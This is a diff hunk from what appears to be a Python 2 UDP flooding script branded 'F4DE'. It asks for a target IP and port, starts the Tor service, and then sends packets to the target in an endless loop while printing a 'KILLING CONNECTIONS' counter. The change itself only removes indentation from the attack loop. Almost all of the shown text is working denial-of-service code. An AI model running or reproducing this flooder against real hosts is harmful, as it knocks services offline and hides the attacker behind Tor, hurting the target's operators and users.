@@ -41,11 +41,11 @@ print ip
 os.system('''echo "host ip" | lolcat''')
 port = input(G+'[?] \033[0m3NTER P0RT : ')
 
-	os.system("service tor start")
-	print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
-	sent = 0
+os.system("service tor start")
+print N+"F4DE attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
+sent = 0
 
-	while True:
-		sock.sendto(packets, (ip, port))
-		sent = sent + 1
-		print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
+while True:
+	sock.sendto(packets, (ip, port))
+	sent = sent + 1
+	print N+"KILLING CONNECTIONS   status :  packets [%s]   target : [%s]   port : [%s]"%(sent,ip,port)
